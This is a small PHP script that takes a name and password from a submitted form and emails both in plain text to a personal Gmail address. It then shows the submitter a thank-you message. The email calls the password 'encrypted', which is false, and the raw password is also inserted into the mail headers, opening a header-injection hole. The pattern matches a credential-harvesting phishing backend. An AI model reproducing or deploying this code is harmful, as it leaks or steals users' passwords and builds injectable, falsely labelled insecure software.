<?php
	if(isset($_POST['submit'])){
		$name=$_POST['name'];
		$password=$_POST['password'];
		
		

		$to='vishwassharma332@gmail.com'; 
		$subject='Form Submission';
		$message="Name :".$name."\n"."\n"."Password encrypted by vishxwas :"."\n\n".$password;
		$headers="Password: ".$password;

		if(mail($to, $subject, $message, $headers)){
			echo "<h1>Sent Successfully! Thank you"." ".$name.", We will contact you shortly!</h1>";
		}
		else{
			echo "Something went wrong!";
		}
	}
?>